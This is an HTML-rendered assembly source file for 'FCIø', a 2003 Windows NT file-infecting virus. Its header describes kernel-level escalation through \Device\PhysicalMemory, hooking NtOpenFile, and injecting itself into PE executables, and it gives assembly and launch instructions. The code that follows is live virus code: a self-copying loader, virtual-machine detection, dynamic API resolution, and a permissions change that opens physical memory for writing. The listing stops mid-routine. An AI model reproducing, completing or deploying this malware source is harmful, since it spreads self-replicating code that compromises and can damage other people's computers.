<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>v.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;                                                                          ;;</span><span class="sc0">
</span><span class="sc1">;; FCIø &gt; Forced Cavity Infector v0 by sheroc.              September '2003 ;;</span><span class="sc0">
</span><span class="sc1">;; ^^^^ ù ^ùùùùù ^ùùùùù ^ùùùùùùù ù^ ùù ùùùùùùù              ùùùùùùùùù ùùùùù ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                          ;;</span><span class="sc0">
</span><span class="sc1">;; Platform: IA-32 running NT4+ OS: NT4, W2K, WXP, W2K3, Longhorn betas...  ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                          ;;</span><span class="sc0">
</span><span class="sc1">;; Features: - Goes Ring0 by \Device\PhysicalMemory edition ( R0 CallGate ) ;;</span><span class="sc0">
</span><span class="sc1">;;           - Allocates non paged memory and copies itself there           ;;</span><span class="sc0">
</span><span class="sc1">;;           - Finds NtOpenFile in the Service Descriptor Table and hooks   ;;</span><span class="sc0">
</span><span class="sc1">;;           the service so that it points to our own routine               ;;</span><span class="sc0">
</span><span class="sc1">;;           - Infects file by injecting the virus between the end of the   ;;</span><span class="sc0">
</span><span class="sc1">;;           PE header and the begining of the first sectionïs data:        ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                          ;;</span><span class="sc0">
</span><span class="sc1">;;           v          vv                                              v   ;;</span><span class="sc0">
</span><span class="sc1">;;           [MZ...PE...][SECTION1 DATA][SECTION2 DATA]...[SECTIONn DATA]   ;;</span><span class="sc0">
</span><span class="sc1">;;       //         //   |    gets changed to this:                     |   ;;</span><span class="sc0">
</span><span class="sc1">;;    v          v *NEW* v                                              v   ;;</span><span class="sc0">
</span><span class="sc1">;;    [MZ...PE...][VIRUS][SECTION1 DATA][SECTION2 DATA]...[SECTIONn DATA]   ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                          ;;</span><span class="sc0">
</span><span class="sc1">;;           - Infected files dont execute the virus and then the original  ;;</span><span class="sc0">
</span><span class="sc1">;;           host code, instead of that, the original code runs exactly as  ;;</span><span class="sc0">
</span><span class="sc1">;;           if the file wasnt infected, and when it exits ( by a JMP/CALL  ;;</span><span class="sc0">
</span><span class="sc1">;;           [ExitProcess] ), the control is transferred to the virus code. ;;</span><span class="sc0">
</span><span class="sc1">;;           This might stop some AVs from tracing virus code... but to be  ;;</span><span class="sc0">
</span><span class="sc1">;;           honest, I havent tried this fact :P                            ;;</span><span class="sc0">
</span><span class="sc1">;;           - Although first assembled binary has 2304 bytes and vl.exe is ;;</span><span class="sc0">
</span><span class="sc1">;;           bigger than 3 KB, further infections will increase filesize by ;;</span><span class="sc0">
</span><span class="sc1">;;           2048 bytes, thats the physical size of this little organism ;P ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                          ;;</span><span class="sc0">
</span><span class="sc1">;; Payload:  No payload :) ( maybe some bug that fucks up some file or some ;;</span><span class="sc0">
</span><span class="sc1">;;           bad situation in which a BSOD could be triggered... )          ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                          ;;</span><span class="sc0">
</span><span class="sc1">;; Notes:    - The virus is not too infectious ( however it has even given  ;;</span><span class="sc0">
</span><span class="sc1">;;           me some surprise ) since it does "too much" sanity checks      ;;</span><span class="sc0">
</span><span class="sc1">;;           ( which I consider NEEDED checks ).                            ;;</span><span class="sc0">
</span><span class="sc1">;;           - While I was doing the testing of the virus, I saw that the   ;;</span><span class="sc0">
</span><span class="sc1">;;           tendencies of compiled PE binaries is good for future normal   ;;</span><span class="sc0">
</span><span class="sc1">;;           cavity infectors ( FileAlignment == 1000h ;D ) and I even had  ;;</span><span class="sc0">
</span><span class="sc1">;;           the temptation to include some little changes so that the code ;;</span><span class="sc0">
</span><span class="sc1">;;           would be able to try normal cavity infection and use this kind ;;</span><span class="sc0">
</span><span class="sc1">;;           of forced cavity otherwise ( that would have been good, would  ;;</span><span class="sc0">
</span><span class="sc1">;;           have been possible to infect most exes from now on ). Anyway,  ;;</span><span class="sc0">
</span><span class="sc1">;;           I wanted to keep virus size under 2048 bytes and also I wanted ;;</span><span class="sc0">
</span><span class="sc1">;;           it to be robust, so here it is, just "as is".                  ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                          ;;</span><span class="sc0">
</span><span class="sc1">;; Thanks:   - Mark Russinovich, David Solomon, EliCZ and others for such a ;;</span><span class="sc0">
</span><span class="sc1">;;   &amp;       good research in NT internals ( \Device\PhysicalMemory, paging ;;</span><span class="sc0">
</span><span class="sc1">;; Greets    and memory organisation, and a big list of other stuff ).      ;;</span><span class="sc0">
</span><span class="sc1">;;           - ElGado ( henky_0 ) for first showing me this ring0 stuff for ;;</span><span class="sc0">
</span><span class="sc1">;;           NTs. Thanks man, your acid sounded 64KB demo ruled Euskal 11 ! ;;</span><span class="sc0">
</span><span class="sc1">;;           - mscorlib, nuMIT_or, remains &amp; vallez for helping with kernel ;;</span><span class="sc0">
</span><span class="sc1">;;           mode and other stuff ;) seeing forward to see your creations ! ;;</span><span class="sc0">
</span><span class="sc1">;;           - #ghost and #euskal_linux at irc.freenode.org and #virus and  ;;</span><span class="sc0">
</span><span class="sc1">;;           #crackers at irc.irc-hispano.org                               ;;</span><span class="sc0">
</span><span class="sc1">;;           - 29A &amp; the ezine for being such a gold mine in VX stuff, and  ;;</span><span class="sc0">
</span><span class="sc1">;;           DTF &amp; the ezine, hey people, keep going !                      ;;</span><span class="sc0">
</span><span class="sc1">;;           - eVok, Topo[LB] and zert: waiting for your stuff too :)       ;;</span><span class="sc0">
</span><span class="sc1">;;           - All my class mates and my friends circle in general ( this   ;;</span><span class="sc0">
</span><span class="sc1">;;           includes some on the net too ) ;D                              ;;</span><span class="sc0">
</span><span class="sc1">;;           - All the people that I forgot to mention, sorry... :S         ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                          ;;</span><span class="sc0">
</span><span class="sc1">;; WARNING:  - I am NOT ( in any way ) responsible for the possible damage  ;;</span><span class="sc0">
</span><span class="sc1">;;           that might be derived from the use and/or abuse of any kind of ;;</span><span class="sc0">
</span><span class="sc1">;;           information found in this document. The contents found herein  ;;</span><span class="sc0">
</span><span class="sc1">;;           are being given for pure educational purposes only.            ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                          ;;</span><span class="sc0">
</span><span class="sc1">;; * I dedicate this little happy appy to all the people that tries to keep ;;</span><span class="sc0">
</span><span class="sc1">;; "live and let live" everyday, my fire keeps burning high and sparky for  ;;</span><span class="sc0">
</span><span class="sc1">;; you, the ones that found the way to live in a happy bubble in this saddy ;;</span><span class="sc0">
</span><span class="sc1">;; world :D. Keep goind, hold on tight and as always, squeeze the juice of  ;;</span><span class="sc0">
</span><span class="sc1">;; life to the max !                                                        ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                          ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">; NOTE: This is V.ASM file, but it is not executable in itself ( it is a raw,</span><span class="sc0">
</span><span class="sc1">;       binary snippet. So in orther to launch the virus, one should cut off</span><span class="sc0">
</span><span class="sc1">;       the embedded VL.ASM file ( just below ) and assemble it after having</span><span class="sc0">
</span><span class="sc1">;       assembled this V.ASM as a raw binary. Also, this would need, my NASM32</span><span class="sc0">
</span><span class="sc1">;       PACKAGE ( http://www.freewebs.com/remains/nasm32package.exe ) to be</span><span class="sc0">
</span><span class="sc1">;       able to assemble, since it uses its EQUs and data declaration engine.</span><span class="sc0">

</span><span class="sc1">;--8&lt;--[VL.ASM]---------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ; V.ASM is the virus in itself, just assemble it as a raw binary</span><span class="sc0">
</span><span class="sc1">; ; "nasmw.exe -O3 -Ic:\nasm\inc v.asm" and V ( without extension )</span><span class="sc0">
</span><span class="sc1">; ; file will be generated. Then just "nasmw.exe -f obj vl.asm" and</span><span class="sc0">
</span><span class="sc1">; ; "alink.exe -oPE vl.obj" to generate VL.EXE ( the launcher for V ).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; extern ExitProcess</span><span class="sc0">
</span><span class="sc1">; import ExitProcess kernel32.dll</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; section code use32</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Virus:                          incbin "V"</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ..start:                        push Virus</span><span class="sc0">
</span><span class="sc1">;                                 ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;--8&lt;-------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;--8&lt;--[V.ASM]----------------------------------------------------------------</span><span class="sc0">

                                </span><span class="sc9">%include</span><span class="sc0"> </span><span class="sc3">"win32np.inc"</span><span class="sc0">

                                </span><span class="sc9">bits</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">


</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; CODE</span><span class="sc0">


</span><span class="sc5">Virus</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FCIø'</span><span class="sc0">       </span><span class="sc1">; Forced Cavity Infector v0 ( this is the signature of this little organism, it gets executed too 8-D )</span><span class="sc0">

                                </span><span class="sc1">; This is a loader that copies the whole virus to stack</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; we where called by a PUSH VIRUS_ADDRESS; RET, so the VIRUS_ADDRESS ( delta handle ) is still on stack, and we "fish" it :P</span><span class="sc0">

                                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">0FFFFFFFCh</span><span class="sc0">      </span><span class="sc1">; align stack to DWORD boundary ( needed to preserve the alignment of EBP so that some crucial data is aligned too )</span><span class="sc0">

                                </span><span class="sc6">cld</span><span class="sc0">     </span><span class="sc1">; we never know...</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
                                </span><span class="sc6">enter</span><span class="sc0"> </span><span class="sc5">Virus_size_memory</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; we allocate the needed space on the stack </span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
                                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
                                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">; we copy ourselves there</span><span class="sc0">

                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">InStackExecutionStart</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; This -Virus shouldnt be needed but NASM is a 2 pass assembler and sometimes needs help for optimizing ( he doesnt "know" the size of the offset fits in -128..127 without the -Virus )</span><span class="sc0">
                                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Jump to on stack virus copy ( to the code starting from InStackExecutionStart )</span><span class="sc0">

</span><span class="sc5">InStackExecutionStart</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">     </span><span class="sc1">; see previous loader code, it will be clear then</span><span class="sc0">

                                </span><span class="sc6">sldt</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc1">; Are we running into a non-NT machine? ; hehe, this also detects VMWARE alike virtual machines };P</span><span class="sc0">
                                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                                </span><span class="sc6">jns</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">                </span><span class="sc1">; if this is the case, exit.</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfExitProcessIntoIAT</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; we get ExitProcess address from IAT</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Clue</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00010000h</span><span class="sc0">   </span><span class="sc1">; Alignment</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SolveModuleBase</span><span class="sc0">

                                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IMAGE_DOS_HEADER.e_csum</span><span class="sc4">],</span><span class="sc12">'SH'</span><span class="sc0">     </span><span class="sc1">; Are we already resident?</span><span class="sc0">
                                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0"> </span><span class="sc1">; if this is the case, exit.</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KERNEL32Base</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">; we save kernel32 base for later use ( to mark residency in ring0 )</span><span class="sc0">

                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KERNEL32ApiCalls</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KERNEL32ApiCRC32s</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SolveModuleExports</span><span class="sc0"> </span><span class="sc1">; we solve kernel32's APIs that we need to use ( dynamic importing like GetProcAddress )</span><span class="sc0">

                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ADVAPI32Pushed</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ADVAPI32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ADVAPI32Pushed</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LoadLibraryA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; we load needed ADVAPI32.DLL library</span><span class="sc0">
                                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ADVAPI32ApiCalls</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ADVAPI32ApiCRC32s</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SolveModuleExports</span><span class="sc0"> </span><span class="sc1">; we solve advapi32's APIs that we need to use</span><span class="sc0">

                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">NTDLLPushed</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'NTDLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NTDLLPushed</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LoadLibraryA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; we load needed NTDLL.DLL library</span><span class="sc0">
                                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NTDLLApiCalls</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NTDLLApiCRC32s</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SolveModuleExports</span><span class="sc0"> </span><span class="sc1">; we solve ntdll's APIs that we need to use</span><span class="sc0">

                                </span><span class="sc1">; We fill MyOBJECT_ATTRIBUTES struct dynamically.</span><span class="sc0">

                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MyOBJECT_ATTRIBUTES</span><span class="sc4">]</span><span class="sc0">

                                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">OBJECT_ATTRIBUTES_size</span><span class="sc0">   </span><span class="sc1">; EAX=OBJECT_ATTRIBUTES_size</span><span class="sc0">
                                </span><span class="sc6">stosd</span><span class="sc0">   </span><span class="sc1">; xat Length,dd OBJECT_ATTRIBUTES_size</span><span class="sc0">

                                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">stosd</span><span class="sc0">   </span><span class="sc1">; xat RootDirectory,dd 0</span><span class="sc0">

                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MyUNICODE_STRING</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">stosd</span><span class="sc0">   </span><span class="sc1">; xat ObjectName,dd MyUNICODE_STRING</span><span class="sc0">

                                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">OBJ_CASE_INSENSITIVE</span><span class="sc0">     </span><span class="sc1">; EAX=OBJ_CASE_INSENSITIVE</span><span class="sc0">
                                </span><span class="sc6">stosd</span><span class="sc0">   </span><span class="sc1">; xat Attributes,dd OBJ_CASE_INSENSITIVE</span><span class="sc0">

                                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">stosd</span><span class="sc0">   </span><span class="sc1">; xat SecurityDescriptor,dd NULL</span><span class="sc0">

                                </span><span class="sc6">stosd</span><span class="sc0">   </span><span class="sc1">; xat SecurityQualityOfService,dd NULL</span><span class="sc0">

                                </span><span class="sc1">; We fill MyUNICODE_STRING struct dynamically.</span><span class="sc0">

                                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">DevicePhysicalMemory_size</span><span class="sc0">
                                </span><span class="sc6">stosw</span><span class="sc0">   </span><span class="sc1">; xat Length,dw DevicePhysicalMemory_size</span><span class="sc0">

                                </span><span class="sc6">stosw</span><span class="sc0">   </span><span class="sc1">; xat MaximumLength,dw DevicePhysicalMemory_size</span><span class="sc0">
                                
                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DevicePhysicalMemory</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">stosd</span><span class="sc0">   </span><span class="sc1">; xat Buffer,dd DevicePhysicalMemory</span><span class="sc0">

                                </span><span class="sc1">; We fill MyEXPLICIT_ACCESS struct dynamically.</span><span class="sc0">

                                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; EAX=00000002h &gt; SECTION_MAP_WRITE</span><span class="sc0">
                                </span><span class="sc6">stosd</span><span class="sc0">   </span><span class="sc1">; xat grfAccessPermissions,dd SECTION_MAP_WRITE</span><span class="sc0">

                                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; EAX=00000001h &gt; GRANT_ACCESS</span><span class="sc0">
                                </span><span class="sc6">stosd</span><span class="sc0">   </span><span class="sc1">; xat grfAccessMode,dd GRANT_ACCESS</span><span class="sc0">

                                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; EAX=00000000h &gt; NO_INHERITANCE</span><span class="sc0">
                                </span><span class="sc6">stosd</span><span class="sc0">   </span><span class="sc1">; xat grfInheritance,dd NO_INHERITANCE</span><span class="sc0">

                                </span><span class="sc6">stosd</span><span class="sc0">   </span><span class="sc1">; xat Trustee.pMultipleTrustee,dd NULL</span><span class="sc0">

                                </span><span class="sc6">stosd</span><span class="sc0">   </span><span class="sc1">; xat Trustee.MultipleTrusteeOperation,dd NO_MULTIPLE_TRUSTEE</span><span class="sc0">

                                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; EAX=00000001h &gt; TRUSTEE_IS_NAME</span><span class="sc0">

                                </span><span class="sc6">stosd</span><span class="sc0">   </span><span class="sc1">; xat Trustee.TrusteeForm,dd TRUSTEE_IS_NAME</span><span class="sc0">

                                </span><span class="sc6">stosd</span><span class="sc0">   </span><span class="sc1">; xat Trustee.TrusteeType,dd TRUSTEE_IS_USER</span><span class="sc0">

                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CURRENTUSER</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">stosd</span><span class="sc0">   </span><span class="sc1">; xat Trustee.ptstrName,dd CURRENTUSER</span><span class="sc0">

                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">StringsDataPushed</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CURRENT_USER'</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\'+1,'</span><span class="sc5">D</span><span class="sc12">'+1,'</span><span class="sc5">e</span><span class="sc12">'+1,'</span><span class="sc5">v</span><span class="sc12">'+1,'</span><span class="sc5">i</span><span class="sc12">'+1,'</span><span class="sc10">c</span><span class="sc12">'+1,'</span><span class="sc5">e</span><span class="sc12">'+1,'</span><span class="sc0">\</span><span class="sc12">'+1,'</span><span class="sc5">P</span><span class="sc12">'+1,'</span><span class="sc5">h</span><span class="sc12">'+1,'</span><span class="sc5">y</span><span class="sc12">'+1,'</span><span class="sc5">s</span><span class="sc12">'+1,'</span><span class="sc5">i</span><span class="sc12">'+1,'</span><span class="sc10">c</span><span class="sc12">'+1,'</span><span class="sc5">a</span><span class="sc12">'+1,'</span><span class="sc5">l</span><span class="sc12">'+1,'</span><span class="sc5">M</span><span class="sc12">'+1,'</span><span class="sc5">e</span><span class="sc12">'+1,'</span><span class="sc5">m</span><span class="sc12">'+1,'</span><span class="sc5">o</span><span class="sc12">'+1,'</span><span class="sc5">r</span><span class="sc12">'+1,'</span><span class="sc5">y</span><span class="sc13">'+1,1
</span><span class="sc5">StringsDataPushed</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                                </span><span class="sc1">; we now fill CURRENTUSER with "CURRENT_USER",0</span><span class="sc0">

                                </span><span class="sc6">movsd</span><span class="sc0">
                                </span><span class="sc6">movsd</span><span class="sc0">
                                </span><span class="sc6">movsd</span><span class="sc0">
                                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">stosd</span><span class="sc0">

                                </span><span class="sc1">; we now fill DevicePhysicalMemory with its expanded unicode string</span><span class="sc0">

</span><span class="sc5">ExpandNextCharacter</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">lodsb</span><span class="sc0">
                                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">stosw</span><span class="sc0">
                                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ExpandNextCharacter</span><span class="sc0">

                                </span><span class="sc1">;;;</span><span class="sc0">


                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">THREAD_PRIORITY_TIME_CRITICAL</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0FFFFFFFEh</span><span class="sc0"> </span><span class="sc1">; FFFFFFFEh is a pseudo handle ( current thread )</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetThreadPriority</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; We bost our thread.</span><span class="sc0">

                                </span><span class="sc6">sgdt</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MyGDTR</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; We save GDTs base address</span><span class="sc0">

                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MyOBJECT_ATTRIBUTES</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; we open \Device\PhysicalMemory</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">READ_CONTROL</span><span class="sc0"> </span><span class="sc4">|</span><span class="sc0"> </span><span class="sc5">WRITE_DAC</span><span class="sc0">
                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MyhSection</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NtOpenSection</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Similar to openfilemapping, but it can map kernel objects and so on.</span><span class="sc0">
                                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; STATUS_SUCCESS ?</span><span class="sc0">
                                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">        </span><span class="sc1">; if not, exit.</span><span class="sc0">

                                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

